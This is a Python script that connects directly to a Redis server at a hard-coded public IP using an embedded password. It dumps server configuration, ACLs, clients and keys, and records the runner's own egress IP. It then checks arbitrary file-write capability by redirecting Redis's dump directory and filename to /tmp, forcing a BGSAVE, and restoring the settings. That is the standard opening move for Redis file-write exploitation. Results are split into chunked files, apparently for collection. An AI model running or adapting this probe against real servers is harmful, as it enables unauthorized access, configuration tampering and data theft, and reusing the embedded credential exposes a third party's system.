import json,socket,time,ssl,urllib.request,sys,traceback,os
OUT=[]
def log(s):
    print(s,flush=True); OUT.append(str(s))
def req(url,timeout=10,h=None,show=2000):
    try:
        hh={"User-Agent":"Mozilla/5.0"}
        if h: hh.update(h)
        r=urllib.request.urlopen(urllib.request.Request(url,headers=hh),timeout=timeout,context=ssl._create_unverified_context())
        return "HTTP %d OK len=%s %s"%(r.status, r.headers.get('Content-Length'), r.read(show).decode('utf-8','replace'))
    except urllib.error.HTTPError as e:
        try: return "HTTPERR %d %s"%(e.code,e.read(2000).decode('utf-8','replace'))
        except Exception: return "HTTPERR %d"%e.code
    except Exception as e:
        return "ERR %s %s"%(type(e).__name__,str(e)[:120])

class R:
    def __init__(s,host,port,pw,to=8):
        s.s=socket.create_connection((host,port),to); s.s.settimeout(to); s.buf=b""; s.host=host; s.port=port
        if pw: s.cmd("AUTH",pw)
    def _fill(s):
        c=s.s.recv(65536)
        if not c: raise IOError("closed")
        s.buf+=c
    def _parse(s):
        while True:
            if not s.buf: s._fill()
            t=s.buf[:1]
            nl=s.buf.find(b"\r\n")
            if t in (b"+",b"-",b":"):
                if nl<0: s._fill(); continue
                line=s.buf[1:nl]; s.buf=s.buf[nl+2:]
                if t==b"-": return {"err":line.decode('utf-8','replace')}
                return line.decode('utf-8','replace')
            if t==b"$":
                while nl<0: s._fill(); nl=s.buf.find(b"\r\n")
                n=int(s.buf[1:nl]); s.buf=s.buf[nl+2:]
                while len(s.buf)<n+2: s._fill()
                d=s.buf[:n]; s.buf=s.buf[n+2:]
                return d.decode('utf-8','replace')
            if t==b"*":
                while nl<0: s._fill(); nl=s.buf.find(b"\r\n")
                n=int(s.buf[1:nl]); s.buf=s.buf[nl+2:]
                return [s._parse() for _ in range(n)]
            return "?"+repr(s.buf[:60])
    def cmd(s,*a):
        rq=b"*%d\r\n"%len(a)
        for x in a:
            x=x if isinstance(x,bytes) else str(x).encode()
            rq+=b"$%d\r\n"%len(x)+x+b"\r\n"
        s.s.sendall(rq)
        return s._parse()
    def close(s):
        try: s.s.close()
        except: pass

def main():
    log("== RUNNER %s utc=%s"%(socket.gethostname(),time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())))
    log("EGRESS %s"%req("https://ifconfig.me/ip",8))
    try:
        r=R("103.40.14.130",6379,"4GRZhjQ4xhdfNXG4",10)
    except Exception as e:
        log("CONNECT FAIL %s"%e); return
    log("== INFO server ==")
    info=r.cmd("INFO","server")
    keep=[l for l in info.splitlines() if any(k in l for k in ("redis_version","redis_mode","os:","arch_bits","process_id","run_id","tcp_port","executable","config_file","uptime_in_seconds","io_threads","multiplexing"))]
    log("\n".join(keep))
    info2=r.cmd("INFO","clients")
    log("== clients ==\n"+"\n".join([l for l in info2.splitlines() if l.startswith(("connected_clients","blocked_clients","maxclients"))]))
    log("== CONFIG GET (key knobs) ==")
    for k in ("dir","dbfilename","save","bind","protected-mode","port","requirepass","aclfile","enable-module-command","enable-debug-command","rename-command","appendonly","appendfilename","logfile","unixsocket","maxmemory-policy","replica-read-only","masterauth","cluster-enabled","loadmodule","supervised","pidfile","loglevel","daemonize","sanitize-dump-payload","enable-protected-configs","enable-debug-command"):
        log("  %s = %r"%(k,r.cmd("CONFIG","GET",k)))
    log("== ALL CONFIG (filtered) ==")
    try:
        allc=r.cmd("CONFIG","GET","*")
        if isinstance(allc,list):
            d={}
            for i in range(0,len(allc)-1,2):
                d[allc[i]]=allc[i+1]
            keys=[k for k in sorted(d) if any(x in k for x in ("module","command","dir","file","path","script","lua","proto","acl","save","dump","enable","password","require","user","replica","slave","master","notify","protected","sanitize","maxmemory"))]
            for k in keys: log("  CFG %s = %r"%(k,str(d[k])[:200]))
    except Exception as e: log("cfg err %s"%e)
    for c in (("MODULE","LIST"),("ACL","LIST"),("ACL","WHOAMI"),("ROLE",),("DBSIZE",),("INFO","keyspace"),("CLIENT","LIST"),("COMMAND","INFO","CONFIG","SLAVEOF","REPLICAOF","MODULE","SAVE","BGSAVE","DEBUG")):
        try: log("  %s -> %r"%(" ".join(c),str(r.cmd(*c))[:3000]))
        except Exception as e: log("  %s ERR %s"%(" ".join(c),e)); 
    # keys sample
    try:
        ks=r.cmd("KEYS","*")
        log("KEYS n=%d sample=%r"%(len(ks),ks[:40]))
    except Exception as e: log("keys err %s"%e)
    # write capability test (safe tmp, restore after)
    log("== write test ==")
    try:
        orig_dir=r.cmd("CONFIG","GET","dir"); log("orig dir %r"%orig_dir)
        orig_fn=r.cmd("CONFIG","GET","dbfilename")
        log("SET dir /tmp -> %r"%r.cmd("CONFIG","SET","dir","/tmp"))
        log("CONFIG GET dir -> %r"%r.cmd("CONFIG","GET","dir"))
        log("CONFIG SET dbfilename i734probe.rdb -> %r"%r.cmd("CONFIG","SET","dbfilename","i734probe.rdb"))
        log("SET k -> %r"%r.cmd("SET","i734probe","hello"))
        log("BGSAVE -> %r"%r.cmd("BGSAVE"))
        time.sleep(3)
        log("INFO persistence last_rdb %r"%[l for l in r.cmd("INFO","persistence").splitlines() if "rdb" in l][:6])
        log("DEL -> %r"%r.cmd("DEL","i734probe"))
        # restore
        od = orig_dir[1] if isinstance(orig_dir,list) and len(orig_dir)>1 else "/data"
        of = orig_fn[1] if isinstance(orig_fn,list) and len(orig_fn)>1 else "dump.rdb"
        log("restore dir %r -> %r"%(od,r.cmd("CONFIG","SET","dir",od)))
        log("restore dbfilename %r -> %r"%(of,r.cmd("CONFIG","SET","dbfilename",of)))
        log("CONFIG GET dir/fn now %r %r"%(r.cmd("CONFIG","GET","dir"),r.cmd("CONFIG","GET","dbfilename")))
    except Exception as e:
        log("write test err %s"%traceback.format_exc()[:800])
    r.close()
    blob="\n".join(OUT)
    open("zz-734-result.txt","w").write(blob)
    for i in range(0,len(blob),30000):
        open("zz-734-part%d.txt"%(i//30000),"w").write(blob[i:i+30000])
    log("PARTS %d"%(len(blob)//30000+1))

try: main()
except Exception:
    print(traceback.format_exc())
    open("zz-734-result.txt","w").write("\n".join(OUT)+"\n"+traceback.format_exc())
